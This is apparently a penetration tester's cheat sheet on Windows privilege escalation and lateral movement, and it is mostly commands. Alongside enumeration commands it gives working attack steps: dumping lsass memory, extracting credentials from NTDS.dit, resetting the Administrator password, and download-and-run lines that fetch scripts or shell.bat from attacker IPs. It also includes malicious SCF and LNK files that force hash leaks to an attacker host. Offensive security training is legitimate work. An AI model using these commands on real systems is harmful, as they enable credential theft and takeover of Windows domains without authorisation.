---
description: >-
  After gaining a foothold, elevating our privileges will provide more options
  for persistence and may reveal information stored locally that can further our
  access within the environment.
---

# Windows Privilege Escalation

#### Enumeration

<details>

<summary>Basic commands</summary>

```bash
# IP
ipconfig /all

# ARP
arp -a

# Route
route print

# Running processes
tasklist /svc

# Enviroment variables
set

# Systeminfo
systeminfo

# Show hotfixes
wmic qfe

# Installed programs
wmic product get name
```

</details>

```bash
# Installed programs
wmic product get name

# Netstat -ano
netstat -ano
netstat -ano | findstr 6064

# Check privileges
whoami /priv

# Check groups
whoami /groups

# Get all users
net user

# Details group
net localgroup administrators

# Robocopy copy files
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

#### Lateral movemnt

```bash
# Check group members
net localgroup administrators

# Runas
runas /netonly /user:ZENCORP\username powershell

# Change administrator password
net user Administrator test123
```

#### Enumeration Powershell

```powershell
# Windows defender status
Get-MpComputerStatus

# Get hotfixes
Get-HotFix | ft -AutoSize

# Install programs
Get-WmiObject -Class Win32_Product |  select Name, Version

# Get process
get-process -Id 3324
```

#### Powershell

```powershell
# Use mssqclient
mssqlclient.py sql_dev@10.129.43.30 -windows-auth

# Use procdump for memory dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Extracting Credentials from NTDS.dit
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key

# Query events command line
wevtutil qe Security /rd:true /f:text | Select-String "/user"

# Host a script and run on target
IEX (iwr 'http://10.10.10.11/procmon.ps1') 

# Transfer file
certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

#### Use Responder or Inveight  to capture hashes with malicious .lnk or .scf file

Malicious SCF File

```bash
# Save as @name.scf
/[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

Malicious LNK File

```powershell
# Create in powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

#### SharpHound

```powershell
# Download ps1 file
iex(new-object net.webclient).downloadstring("http://10.10.14.6/SharpHound.ps1")

# Collect
invoke-bloodhound -collectionmethod all -domain zen.local -ldapuser username -ldappass password
```

#### Bloodhound-python&#x20;

```bash
bloodhound-python -d zen.local -u username -p password-gc zen.local -c all -ns 10.10.10.22
```

#### Windows privileges

* Fullpowers: [https://github.com/itm4n/FullPowers](https://github.com/itm4n/FullPowers)
* PrintSpoofer: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* GodPotato: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
* JuicyPotato: [https://github.com/ohpe/juicy-potato](https://github.com/ohpe/juicy-potato)

#### Dump a process with ProcDump

```powershell
# Procdump
.\procdump64 -ma 6252 -accepteula

# or with powersploit
Out-Minidump.ps1
menu
get-process -id 6252 | Out-Minidump
```



